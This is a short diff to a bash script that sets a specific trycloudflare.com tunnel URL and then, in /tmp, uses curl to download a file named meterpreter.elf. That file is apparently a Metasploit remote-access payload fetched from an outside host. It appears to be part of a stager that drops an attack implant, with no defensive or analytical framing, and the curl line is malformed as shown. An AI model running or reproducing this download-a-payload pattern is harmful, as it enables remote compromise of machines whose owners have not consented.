@@ -1,5 +1,5 @@
 #!/bin/bash
-CLOUDFLARE="https://abc-123.trycloudflare.com"  # ← YOUR URL HERE
+CLOUDFLARE="https://physically-tutorial-cornwall-tagged.trycloudflare.com"  
 
 cd /tmp
 curl -s "/meterpreter.elf" -o meter.elf
